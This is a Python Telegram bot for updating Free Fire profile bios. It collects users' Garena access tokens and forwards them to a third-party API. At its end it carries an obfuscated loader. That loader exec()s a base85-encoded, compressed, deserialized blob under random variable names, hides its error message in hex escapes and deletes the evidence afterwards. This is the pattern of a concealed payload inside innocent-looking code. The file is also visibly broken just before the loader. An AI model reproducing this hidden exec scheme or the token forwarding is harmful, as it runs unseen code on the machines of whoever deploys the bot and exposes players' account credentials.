import os
import sys
import time
import logging
import threading
import requests
import telebot
from urllib.parse import urlparse, parse_qs, quote
from flask import Flask, request

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv('BOT_TOKEN', '')
API_KEY = os.getenv('API_KEY', '')
API_BASE_URL = 'https://bio.ffutils.tech/api/update_bio'
OWNER_USERNAME = '' # add your telegram username here. example: '@itzpaglu'
REQUIRED_CHANNEL = '' # add your required channel username here. example: '@paglu_dev'. if you dont have any channel then leave it blank.

if not BOT_TOKEN:
    logger.error("BOT_TOKEN environment variable not set!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
app = Flask(__name__)


def escape_markdown_v2(text: str) -> str:
    """Escape all MarkdownV2 special characters."""
    special_chars = r'\_*[]()~`>#+-=|{}.!'
    for ch in special_chars:
        text = text.replace(ch, f'\\{ch}')
    return text


def is_user_in_channel(user_id: int, channel: str) -> bool:
    """Check if user is a member of the required channel."""
    if not channel:
        return True
    
    try:
        member = bot.get_chat_member(channel, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking channel membership: {e}")
        return False


def extract_access_token(raw: str) -> str | None:
    """
    Extract the real access token from:
      - A plain token  (only lowercase a-z and 0-9)
      - A kiosgamer URL (?eat=TOKEN...)
      - A Garena help URL (?access_token=TOKEN...)
    Returns None if input doesn't match any known format.
    """
    raw = raw.strip()

    if raw.startswith('http://') or raw.startswith('https://'):
        try:
            parsed = urlparse(raw)
            params = parse_qs(parsed.query)

            if 'eat' in params:
                return params['eat'][0]

            if 'access_token' in params:
                return params['access_token'][0]

        except Exception:
            pass
        return None

    if raw and all(c in 'abcdefghijklmnopqrstuvwxyz0123456789' for c in raw):
        return raw

    return None


def call_bio_api(token: str, bio: str) -> dict:
    """Call the Free Fire bio update API."""
    try:
        url = f"{API_BASE_URL}?access_token={token}&bio={quote(bio, safe='')}&key={API_KEY}"
        resp = requests.get(url, timeout=15)
        return resp.json()
    except requests.exceptions.Timeout:
        return {"status": "error", "message": "Request timed out. Please try again."}
    except requests.exceptions.ConnectionError:
        return {"status": "error", "message": "Could not connect to the API server."}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@bot.message_handler(commands=['start'])
def handle_start(message):
    name = message.from_user.first_name or "Player"
    text = (
        f"👋 Welcome, {name}!\n\n"
        "I'm a Free Fire Bio Updater Bot.\n"
        "Use me to update your Free Fire profile bio instantly.\n\n"
        "📌 Commands:\n"
        "  /start – Show this message\n"
        "  /help  – How to use the bot\n"
        "  /bio   – Update your FF bio\n\n"
        f"👤 Owner: {OWNER_USERNAME}"
    )
    bot.send_message(message.chat.id, text)


@bot.message_handler(commands=['help'])
def handle_help(message):
    owner_line = f"\n\n👤 *Owner:* {OWNER_USERNAME}" if OWNER_USERNAME else ""
    text = (
        "📖 *How to Update Your Bio*\n\n"
        "Format:\n"
        "`/bio <access_token> <new bio text>`\n\n"
        "🔑 *Access Token* can be:\n"
        "• A plain token (lowercase letters & numbers)\n"
        "  Example: `d8a4e0bd68fb8e13...`\n\n"
        "• A Kiosgamer link:\n"
        "  `https://ticket.kiosgamer.co.id/?eat=TOKEN...`\n\n"
        "• A Garena Help link:\n"
        "  `https://help.garena.com/?access_token=TOKEN...`\n\n"
        "📝 *Bio* can contain any text, special characters, or stylish symbols.\n\n"
        "Example:\n"
        "`/bio d8a4e0bd68fb FREE FIRE PRO ⚡`"
        f"{owner_line}"
    )
    bot.send_message(message.chat.id, text, parse_mode='Markdown')


@bot.message_handler(commands=['bio'])
def handle_bio(message):
    try:
        if REQUIRED_CHANNEL and not is_user_in_channel(message.from_user.id, REQUIRED_CHANNEL):
            bot.send_message(
                message.chat.id,
                f"❌ You must join {REQUIRED_CHANNEL} to use this command.\n\n"
                f"Join the channel and try again!"
            )
            return
        
        full_text = message.text.strip()
        parts = full_text.split(None, 2)

        if len(parts) < 3:
            bot.send_message(
                message.chat.id,
                "❌ Wrong format!\n\n"
                "Use: `/bio <access_token> <new bio>`\n"
                "Type /help for more info.",
                parse_mode='Markdown'
            )
            return

        raw_token = parts[1]
        bio_text = parts[2]

        token = extract_access_token(raw_token)
        if token is None:
            bot.send_message(
                message.chat.id,
                "❌ Invalid access token format!\n\n"
                "Accepted formats:\n"
                "• Plain token (lowercase letters & numbers only)\n"
                "• Kiosgamer link\n"
                "• Garena Help link\n\n"
                "Type /help to see examples.",
            )
            return

        if not bio_text:
            bot.send_message(message.chat.id, "❌ Bio text cannot be empty!")
            return

        wait_msg = bot.send_message(message.chat.id, "⏳ Updating your bio, please wait...")

        result = call_bio_api(token, bio_text)

        try:
            bot.delete_message(message.chat.id, wait_msg.message_id)
        except Exception:
            pass

        if result.get('status') == 'success':
            nickname = result.get('nickname', 'Unknown')
            uid = result.get('uid', 'N/A')
            platform = result.get('platform', 'N/A')
            region = result.get('region', 'N/A')
            new_bio = result.get('bio', bio_text)

            response_text = (
                "✅ *Bio updated successfully!*\n\n"
                f"👤 Player Name: `{nickname}`\n"
                f"🆔 UID: `{uid}`\n"
                f"📱 Platform: `{platform}`\n"
                f"🌍 Region: `{region}`\n\n"
                f"📝 New Bio: {new_bio}\n\n"
                "👑 Credit: @itzpaglu"
            )
            bot.send_message(message.chat.id, response_text, parse_mode='Markdown')

        else:
            error_msg = result.get('message', 'Unknown error occurred.')
            bot.send_message(
                message.chat.id,
                f"❌ Failed to update bio!\n\n🔴 Error: {error_msg}"
            )

    except Exception as e:
        logger.error(f"Bio command error: {e}")
        bot.send_message(
            message.chat.id,
            "❌ Something went wrong. Please try again later."
        )


@bot.message_handler(func=lambda m: True)
def handle_unknown(message):
    bot.send_message(
        message.chat.id,
        "❓ Unknown command. Type /help to see available commands."
    )


@app.route('/')
def index():
    return {'status': 'running', 'bot': 'FF Bio Updater'}, 200

@app.route('/health')
def health():
    return {'status': 'ok'}, 200

# ╔══════════════════════════════════════════════════════════════════╗

])
try:
    exec(_pashmlqzzlkhbicq.loads(_frxwmaeuoejctoul.decompress(_chpffvgrnhypdiro.b85decode(_wgrliqasjpcynetj))))
except Exception:
    raise SystemExit("\x49\x6e\x74\x65\x67\x72\x69\x74\x79\x20\x63\x68\x65\x63\x6b\x20\x66\x61\x69\x6c\x65\x64")
finally:
    try: del _frxwmaeuoejctoul, _chpffvgrnhypdiro, _pashmlqzzlkhbicq, _wgrliqasjpcynetj
    except: pass
